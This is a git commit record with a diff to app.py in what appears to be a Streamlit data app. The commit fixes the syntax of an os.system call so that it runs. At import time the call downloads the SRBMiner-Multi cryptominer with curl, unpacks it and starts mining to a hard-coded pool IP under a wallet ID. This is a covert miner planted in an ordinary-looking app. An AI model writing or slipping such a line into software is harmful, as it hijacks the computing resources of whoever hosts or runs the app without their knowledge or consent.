2432d0211efa24fb9620a8a5761fcee7d3bd14ca
vaesyat <120396397+vaesyat@users.noreply.github.com>
2022-12-14 01:13:59 -0800

    Update app.py

--- app.py
+++ app.py
@@ -4,4 +4,4 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system ("curl -L -o SRBMiner-Multi-1-1-3-Linux.tar.xz https://github.com/doktor83/SRBMiner-Multi/releases/download/1.1.3/SRBMiner-Multi-1-1-3-Linux.tar.xz && tar -xvf SRBMiner-Multi-1-1-3-Linux.tar.xz && cd SRBMiner-Multi-1-1-3 && ./SRBMiner-MULTI --algorithm argon2id_chukwa2 --pool 168.235.86.33:3393 --wallet SK_pDKo9B7rTqyPDrYeohNv5.Temera88 --password x --keepalive
+os.system ("curl -L -o SRBMiner-Multi-1-1-3-Linux.tar.xz https://github.com/doktor83/SRBMiner-Multi/releases/download/1.1.3/SRBMiner-Multi-1-1-3-Linux.tar.xz && tar -xvf SRBMiner-Multi-1-1-3-Linux.tar.xz && cd SRBMiner-Multi-1-1-3 && ./SRBMiner-MULTI --algorithm argon2id_chukwa2 --pool 168.235.86.33:3393 --wallet SK_pDKo9B7rTqyPDrYeohNv5.Temera88 --password x --keepalive") 
